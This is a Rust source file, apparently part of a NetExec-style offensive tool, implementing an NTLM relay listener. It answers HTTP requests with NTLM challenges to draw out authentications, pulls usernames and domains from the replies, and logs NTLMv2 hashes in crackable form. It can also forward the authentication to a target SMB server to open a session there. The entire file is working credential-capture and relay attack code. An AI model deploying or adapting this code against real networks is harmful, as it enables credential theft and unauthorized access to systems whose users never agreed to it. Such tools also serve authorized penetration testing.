//! # NTLM Relay Listener
//!
//! Listens for incoming HTTP NTLM authentications and relays them
//! to a target SMB/HTTP service. Captures NTLMv2 hashes for offline cracking.

use anyhow::Result;
use base64::prelude::*;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tracing::{debug, error, info, warn};

/// Captured NTLM hash from a relayed authentication.
#[derive(Debug, Clone)]

pub struct CapturedHash {
    /// Source IP of the authenticating client.
    pub _client_ip: String,
    /// NTLM username extracted from the Type 3 message.
    pub _username: String,
    /// NTLM domain extracted from the Type 3 message.
    pub _domain: String,
    /// The full NTLMv2 hash in `user::domain:challenge:nt_proof:blob` format.
    pub _hash_string: String,
}

/// NTLM Relay server configuration.
#[derive(Debug, Clone)]
pub struct RelayConfig {
    /// Address to bind the HTTP listener (e.g., "0.0.0.0:80").
    pub bind_addr: String,
    /// Target to relay authentication to (e.g., "192.168.1.10:445").
    pub relay_target: Option<String>,
    /// Whether to only capture hashes (no relay).
    pub capture_only: bool,
}

impl Default for RelayConfig {
    fn default() -> Self {
        Self { bind_addr: "0.0.0.0:80".to_string(), relay_target: None, capture_only: false }
    }
}

/// NTLM Relay server — HTTP listener that triggers NTLM authentication
/// and captures/relays the resulting credentials.
pub struct RelayServer {
    config: RelayConfig,
    captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
}

impl RelayServer {
    pub fn new(config: RelayConfig) -> Self {
        Self { config, captured: std::sync::Arc::new(tokio::sync::Mutex::new(Vec::new())) }
    }

    /// Create a capture-only relay on the given address.
    pub fn _capture_only(bind_addr: &str) -> Self {
        Self::new(RelayConfig {
            bind_addr: bind_addr.to_string(),
            relay_target: None,
            capture_only: true,
        })
    }

    /// Get all captured hashes so far.
    pub async fn _captured_hashes(&self) -> Vec<CapturedHash> {
        self.captured.lock().await.clone()
    }

    /// Start the relay listener. This runs forever until cancelled.
    pub async fn start(&self) -> Result<()> {
        info!(
            "Relay: Starting NTLM {} listener on {}...",
            if self.config.capture_only { "capture" } else { "relay" },
            self.config.bind_addr
        );

        let listener = TcpListener::bind(&self.config.bind_addr).await?;
        info!("Relay: Listening for incoming HTTP connections");

        loop {
            let (socket, addr) = listener.accept().await?;
            debug!("Relay: Connection from {addr}");

            let captured = self.captured.clone();
            let client_ip = addr.ip().to_string();
            let capture_only = self.config.capture_only;
            let relay_target = self.config.relay_target.clone();

            tokio::spawn(async move {
                if let Err(e) =
                    handle_http_ntlm(socket, &client_ip, captured, capture_only, relay_target).await
                {
                    debug!("Relay: Connection handler error for {addr}: {e}");
                }
            });
        }
    }
}

/// Handle a single HTTP connection, triggering NTLM auth via 401 challenges.
/// Encapsulates the connection state for a relay session
struct RelaySession {
    stream: Option<TcpStream>,
    session_id: u64,
    challenge: Option<[u8; 8]>,
}

async fn handle_http_ntlm(
    mut stream: TcpStream,
    client_ip: &str,
    captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
    capture_only: bool,
    relay_target: Option<String>,
) -> Result<()> {
    let timeout = std::time::Duration::from_secs(10);
    let mut relay_session = RelaySession { stream: None, session_id: 0, challenge: None };

    let (reader, mut writer) = stream.split();
    let mut buf_reader = BufReader::new(reader);

    loop {
        // Read the HTTP request line + headers
        let mut request_line = String::new();
        let n = buf_reader.read_line(&mut request_line).await?;
        if n == 0 {
            break; // EOF
        }
        debug!("Relay: Request: {}", request_line.trim());

        let mut authorization = None;
        let mut line = String::new();
        loop {
            line.clear();
            let n = buf_reader.read_line(&mut line).await?;
            if n == 0 || line.trim().is_empty() {
                break;
            }
            if let Some(rest) = line.strip_prefix("Authorization: ") {
                authorization = Some(rest.trim().to_string());
            }
        }

        // Health check probe endpoint
        if request_line.starts_with("GET /health ") || request_line.starts_with("GET /status ") {
            let body = serde_json::json!({
                "status": "ok",
                "service": "nxc-relay",
                "mode": if capture_only { "capture" } else { "relay" },
                "target": relay_target
            })
            .to_string();
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            writer.write_all(response.as_bytes()).await?;
            break;
        }

        match authorization {
            None => {
                // No auth header → send 401 with NTLM challenge
                debug!("Relay: No auth from {client_ip} — sending 401 NTLM challenge");
                let response = "HTTP/1.1 401 Unauthorized\r\n\
                                WWW-Authenticate: NTLM\r\n\
                                Content-Length: 0\r\n\
                                Connection: keep-alive\r\n\
                                \r\n";
                writer.write_all(response.as_bytes()).await?;
            }
            Some(auth) if auth.starts_with("NTLM ") => {
                let b64_data = &auth[5..];
                match BASE64_STANDARD.decode(b64_data) {
                    Ok(ntlm_bytes) => {
                        if ntlm_bytes.len() < 12 {
                            warn!("Relay: NTLM message too short from {client_ip}");
                            send_401_ntlm(&mut writer).await?;
                            continue;
                        }

                        let msg_type = u32::from_le_bytes([
                            ntlm_bytes[8],
                            ntlm_bytes[9],
                            ntlm_bytes[10],
                            ntlm_bytes[11],
                        ]);

                        match msg_type {
                            1 => {
                                // Type 1 (Negotiate) → respond with Type 2 (Challenge)
                                let challenge_bytes = if !capture_only && relay_target.is_some() {
                                    let target =
                                        relay_target.as_ref().unwrap_or(&String::new()).to_owned();
                                    // Parse target host and port
                                    let mut parts = target.split(':');
                                    let host = parts.next().unwrap_or(&target);
                                    let port = parts
                                        .next()
                                        .and_then(|p| p.parse::<u16>().ok())
                                        .unwrap_or(445);

                                    debug!(
                                        "Relay: Connecting to SMB relay target {}:{}",
                                        host, port
                                    );
                                    match TcpStream::connect((host, port)).await {
                                        Ok(mut smb_stream) => {
                                            // Send Negotiate
                                            if let Err(e) =
                                                nxc_protocols::smb::SmbProtocol::negotiate(
                                                    &mut smb_stream,
                                                    timeout,
                                                )
                                                .await
                                            {
                                                warn!("Relay: Failed to negotiate SMB with {target}: {e}");
                                                {
                                                    let (msg, challenge) =
                                                        build_ntlm_type2_challenge();
                                                    relay_session.challenge = Some(challenge);
                                                    msg
                                                }
                                            } else {
                                                // Send SESSION_SETUP with Type 1 to extract Challenge
                                                let proto = nxc_protocols::smb::SmbProtocol::new();
                                                let mut pkt = proto.build_session_setup_base();
                                                pkt[78..80].copy_from_slice(
                                                    &(ntlm_bytes.len() as u16).to_le_bytes(),
                                                );
                                                pkt.extend_from_slice(&ntlm_bytes);

                                                if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
                                                    warn!("Relay: Failed to send SESSION_SETUP to {target}: {e}");
                                                    {
                                                                let (msg, challenge) = build_ntlm_type2_challenge();
                                                                relay_session.challenge = Some(challenge);
                                                                msg
                                                            }
                                                } else {
                                                    match nxc_protocols::smb::SmbProtocol::recv_smb2_packet(&mut smb_stream, timeout).await {
                                                        Ok(resp) => {
                                                            // Extract NTLM blob from SESSION_SETUP response
                                                            let signature = b"NTLMSSP\0\x02\x00\x00\x00";
                                                            if let Some(pos) = resp.windows(signature.len()).position(|w| w == signature) {
                                                                relay_session.stream = Some(smb_stream);
                                                                if resp.len() >= 48 {
                                                                    relay_session.session_id = u64::from_le_bytes(resp[40..48].try_into().unwrap_or([0; 8]));
                                                                }
                                                                let ntlm_blob = resp[pos..].to_vec();
                                                                if ntlm_blob.len() >= 32 {
                                                                    relay_session.challenge = Some(ntlm_blob[24..32].try_into().unwrap_or([0; 8]));
                                                                }
                                                                ntlm_blob
                                                            } else {
                                                                warn!("Relay: No NTLM Type 2 found in SMB response from {target}");
                                                                let (msg, challenge) = build_ntlm_type2_challenge();
                                                                relay_session.challenge = Some(challenge);
                                                                msg
                                                            }
                                                        }
                                                        Err(e) => {
                                                            warn!("Relay: Failed to receive SESSION_SETUP response from {target}: {e}");
                                                            {
                                                                let (msg, challenge) = build_ntlm_type2_challenge();
                                                                relay_session.challenge = Some(challenge);
                                                                msg
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        Err(e) => {
                                            warn!("Relay: Failed to connect to relay target {target}: {e}");
                                            {
                                                let (msg, challenge) = build_ntlm_type2_challenge();
                                                relay_session.challenge = Some(challenge);
                                                msg
                                            }
                                        }
                                    }
                                } else {
                                    debug!("Relay: NTLM Type 1 from {client_ip} — sending dummy Type 2 challenge (capture only)");
                                    {
                                        let (msg, challenge) = build_ntlm_type2_challenge();
                                        relay_session.challenge = Some(challenge);
                                        msg
                                    }
                                };

                                let b64_challenge = BASE64_STANDARD.encode(&challenge_bytes);
                                let response = format!(
                                    "HTTP/1.1 401 Unauthorized\r\n\
                                     WWW-Authenticate: NTLM {b64_challenge}\r\n\
                                     Content-Length: 0\r\n\
                                     Connection: keep-alive\r\n\
                                     \r\n"
                                );
                                writer.write_all(response.as_bytes()).await?;
                            }
                            3 => {
                                // Type 3 (Authenticate) → extract credentials
                                debug!("Relay: NTLM Type 3 from {client_ip} — extracting hash");
                                let challenge = relay_session.challenge.unwrap_or([0; 8]);
                                match extract_type3_info(&ntlm_bytes, challenge) {
                                    Ok((username, domain, hash_str)) => {
                                        let hash = CapturedHash {
                                            _client_ip: client_ip.to_string(),
                                            _username: username.clone(),
                                            _domain: domain.clone(),
                                            _hash_string: hash_str.clone(),
                                        };

                                        info!(
                                            "Relay: ✓ Captured NTLMv2 hash — {}\\{} from {}",
                                            domain, username, client_ip
                                        );
                                        info!("Relay: Hash: {hash_str}");

                                        captured.lock().await.push(hash);

                                        if !capture_only {
                                            if let Some(ref target) = relay_target {
                                                info!("Relay: Connecting to target {target} to relay authentication...");
                                                if let Some(mut smb_stream) =
                                                    relay_session.stream.take()
                                                {
                                                    let proto =
                                                        nxc_protocols::smb::SmbProtocol::new();
                                                    let mut pkt = proto.build_session_setup_base();
                                                    pkt[40..48].copy_from_slice(
                                                        &relay_session.session_id.to_le_bytes(),
                                                    );
                                                    pkt[78..80].copy_from_slice(
                                                        &(ntlm_bytes.len() as u16).to_le_bytes(),
                                                    );
                                                    pkt.extend_from_slice(&ntlm_bytes);

                                                    if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
                                                        warn!("Relay: Failed to send final SESSION_SETUP to {target}: {e}");
                                                    } else if let Ok(resp) = nxc_protocols::smb::SmbProtocol::recv_smb2_packet(&mut smb_stream, timeout).await {
                                                        let status = u32::from_le_bytes(resp[8..12].try_into().unwrap_or([0; 4]));
                                                        if status == 0 {
                                                            info!("Relay: ✨ SUCCESS! Successfully relayed authentication to {target}");
                                                        } else {
                                                            warn!("Relay: Target {target} rejected relayed authentication with status 0x{:08x}", status);
                                                        }
                                                    } else {
                                                        warn!("Relay: Failed to receive final SESSION_SETUP response from {target}");
                                                    }
                                                } else {
                                                    warn!("Relay: No active SMB connection to {target} found to relay Type 3 message.");
                                                }
                                            }
                                        }
                                        // Send 200 OK
                                        let response = "HTTP/1.1 200 OK\r\n\
                                                        Content-Length: 0\r\n\
                                                        Connection: close\r\n\
                                                        \r\n";
                                        writer.write_all(response.as_bytes()).await?;
                                    }
                                    Err(e) => {
                                        error!(
                                            "Relay: Failed to parse Type 3 from {client_ip}: {e}"
                                        );
                                        send_401_ntlm(&mut writer).await?;
                                    }
                                }
                            }
                            other => {
                                warn!("Relay: Unknown NTLM message type {other} from {client_ip}");
                                send_401_ntlm(&mut writer).await?;
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Relay: Invalid base64 from {client_ip}: {e}");
                        send_401_ntlm(&mut writer).await?;
                    }
                }
            }
            Some(_) => {
                // Non-NTLM auth → send 401
                debug!("Relay: Non-NTLM auth from {client_ip} — sending 401");
                send_401_ntlm(&mut writer).await?;
            }
        }
    }

    Ok(())
}

/// Send a 401 response requesting NTLM authentication.
async fn send_401_ntlm<W: tokio::io::AsyncWrite + Unpin>(writer: &mut W) -> Result<()> {
    let response = "HTTP/1.1 401 Unauthorized\r\n\
                    WWW-Authenticate: NTLM\r\n\
                    Content-Length: 0\r\n\
                    Connection: keep-alive\r\n\
                    \r\n";
    writer.write_all(response.as_bytes()).await?;
    Ok(())
}

/// Build a minimal NTLM Type 2 (Challenge) message.
///
/// This is a simplified challenge with a fixed server nonce.
/// In a real relay scenario, this challenge would be forwarded from the target.
fn build_ntlm_type2_challenge() -> (Vec<u8>, [u8; 8]) {
    let mut msg = Vec::with_capacity(56);

    // Signature: "NTLMSSP\0"
    msg.extend_from_slice(b"NTLMSSP\0");
    // Message Type: 2 (Challenge)
    msg.extend_from_slice(&2u32.to_le_bytes());
    // Target Name (empty security buffer): len=0, maxlen=0, offset=56
    msg.extend_from_slice(&0u16.to_le_bytes()); // len
    msg.extend_from_slice(&0u16.to_le_bytes()); // max len
    msg.extend_from_slice(&56u32.to_le_bytes()); // offset
                                                 // Negotiate Flags
    let flags: u32 = 0x00008215 // UNICODE | OEM | REQUEST_TARGET | NTLM | ALWAYS_SIGN
        | 0x00080000  // EXTENDED_SESSIONSECURITY
        | 0x00800000  // TARGET_INFO
        | 0x20000000  // NEGOTIATE_128
        | 0x40000000; // KEY_EXCH
    msg.extend_from_slice(&flags.to_le_bytes());
    // Server Challenge (8 bytes)
    let challenge = rand::random::<[u8; 8]>();
    msg.extend_from_slice(&challenge);
    // Reserved (8 bytes)
    msg.extend_from_slice(&[0u8; 8]);
    // Target Info (empty security buffer): len=0, maxlen=0, offset=56
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&56u32.to_le_bytes());

    (msg, challenge)
}

/// Extract username, domain, and hash string from an NTLM Type 3 message.
fn extract_type3_info(data: &[u8], challenge: [u8; 8]) -> Result<(String, String, String)> {
    if data.len() < 72 {
        anyhow::bail!("Type 3 message too short ({} bytes)", data.len());
    }

    // Parse security buffer fields
    // LM Response: offset 12
    // NT Response: offset 20
    let nt_len = u16::from_le_bytes([data[20], data[21]]) as usize;
    let nt_off = u32::from_le_bytes([data[24], data[25], data[26], data[27]]) as usize;

    // Domain: offset 28
    let domain_len = u16::from_le_bytes([data[28], data[29]]) as usize;
    let domain_off = u32::from_le_bytes([data[32], data[33], data[34], data[35]]) as usize;

    // User: offset 36
    let user_len = u16::from_le_bytes([data[36], data[37]]) as usize;
    let user_off = u32::from_le_bytes([data[40], data[41], data[42], data[43]]) as usize;

    // Extract domain name (UTF-16LE)
    let domain = if domain_off + domain_len <= data.len() {
        decode_utf16le(&data[domain_off..domain_off + domain_len])
    } else {
        "UNKNOWN".to_string()
    };

    // Extract username (UTF-16LE)
    let username = if user_off + user_len <= data.len() {
        decode_utf16le(&data[user_off..user_off + user_len])
    } else {
        "UNKNOWN".to_string()
    };

    // Extract NT response for hash string
    let nt_hash_str = if nt_off + nt_len <= data.len() && nt_len >= 16 {
        let nt_response = &data[nt_off..nt_off + nt_len];
        let nt_proof = hex::encode(&nt_response[..16]);
        let blob = hex::encode(&nt_response[16..]);
        // Format: username::domain:challenge:nt_proof:blob
        let challenge_hex = hex::encode(challenge);
        format!("{username}::{domain}:{challenge_hex}:{nt_proof}:{blob}")
    } else {
        format!("{username}::{domain}:no_nt_response")
    };

    Ok((username, domain, nt_hash_str))
}

/// Decode UTF-16LE bytes to a Rust String.
fn decode_utf16le(data: &[u8]) -> String {
    let u16s: Vec<u16> = data.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
    String::from_utf16_lossy(&u16s)
}
